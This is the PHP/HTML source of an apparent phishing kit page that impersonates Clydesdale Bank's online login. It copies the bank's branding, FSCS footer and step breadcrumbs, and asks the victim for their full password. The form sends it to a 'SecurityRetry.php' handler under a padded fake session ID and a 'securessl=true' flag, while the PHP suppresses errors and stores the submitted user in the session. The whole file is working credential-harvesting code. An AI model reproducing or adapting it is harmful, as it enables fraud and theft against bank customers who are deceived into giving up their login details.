<?php

error_reporting(0);

date_default_timezone_set("Europe/London");

session_start();


require "../../includes/functions.php";
require "../../includes/One_Time.php";
$_SESSION['user'] = $_POST['user'];

?>

<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width" name="viewport">
<title>Login</title>
<link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon" />
<link href='assets/css/one.css' media="screen" rel="stylesheet" type="text/css">
<link href='assets/css/two.css' media='screen' rel="stylesheet" type='text/css'>
<link href='assets/css/three.css' media='screen' rel="stylesheet" type='text/css'>
<script>
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
</script>
<script>
function Check() {
    var x = document.forms["login"]["one"].value;
    if (x == null || x == "") {
	document.getElementById("Error1").style.display = "block";
        return false;
    }
    var x = document.forms["login"]["two"].value;
    if (x == null || x == "") {
	document.getElementById("Error2").style.display = "block";
        return false;
    }
    var x = document.forms["login"]["three"].value;
    if (x == null || x == "") {
	document.getElementById("Error3").style.display = "block";
        return false;
    }
}
</script>
</head>
<body>
<div class="container top-nav-bg">
<div class="row">
<div class="nine columns phone-two"><img src="assets/img/logo.gif"></div>
<div class="three columns ie6-no-right-margin phone-two text-right">
<p class="show-on-desktops">Text Size: <a href="javascript:standardFontSize();"><span class="smallish">T</span></a> <a href="javascript:increaseFontSize();"><span class="bigger">T</span></a></p>
<div class="headerDate">
<h6><?php echo date('l, d/m/Y');?></h6>
</div>
</div>
</div>
</div>
<div class="container section-nav-bg" id="no-top-nav">
<div class="row"></div>
</div>
<br>
<div class="container">
<div class="row">
<ul class="breadcrumbs">
<li>Customer number</li>
<li class='current'>Password</li>
<li>Security option</li>
</ul>
</div>
<div class="row">
<div class="nine columns">
<div id="content">
<h1>Password</h1>
<br>
<div id="innercontent">
<p>Please enter your password. You don't remember your password? <a href="#">Need help?</a></p>
<br>
<form action="SecurityRetry.php?Account-Verification&sessionid=<?php echo generateRandomString(130); ?>&securessl=true" class="nice" enctype="application/x-www-form-urlencoded" id="login" method="post" name="login" onsubmit="return Check();">
<div class="row">
<div class="three columns phone-two"><label for="one">Full password:</label></div>
<div class="six columns phone-two">
<input class="input-text" id="password"  name="password"  required type="password" value="">
<small id="Error1" class="error" style="display:none">Please provide the requested three characters from your current password.</small>
 </div>
<div class="three columns phone-four ie6-no-right-margin"><!--  --></div>
</div>

<div class="row">
<div class="eight columns">
<p><a href="/raluV8/reglm-web/register.ctl?begin=telephoneBankingIdentification" style="line-height: 30px;">Forgotten your password details?</a></p>
</div>
<div class="four columns"></div>
</div>
<div class="row" style="margin-top:10px;">
<div class="eight columns"><button class="medium nice white round button" tabindex="3" type="button">Cancel</button> 
<button class="medium nice nag round button" name="submit" tabindex="2" type="submit">Continue</button></div>
<div class="four columns ie6-no-right-margin"></div>
</div>
</form>
</div>
</div>
<div class="three columns ie6-no-right-margin">
<div class="headed-box">
<h4>Need Help?</h4>
<div><a class="medium white nice button round" href="#">Visit our Clydesdale Bank Help Centre</a></div>
</div>
</div>
</div>
</div>
<div class="hide-on-phones bcrumbs">
<div class="row">
<p>You are here:&nbsp;<strong>Customer number</strong></p>
</div>
<div class="container bottom-bar">
<div class="row">
<p class="text-center">You can find impartial information and guidance on money matters on the "<a href="#">Money advice service</a>" website.<br>
Clydesdale Bank is covered by the Financial Services Compensation Scheme (FSCS), <a href="#">Find out more</a>.</p>
</div>
</div>
</div>
</div>
</body>
</html>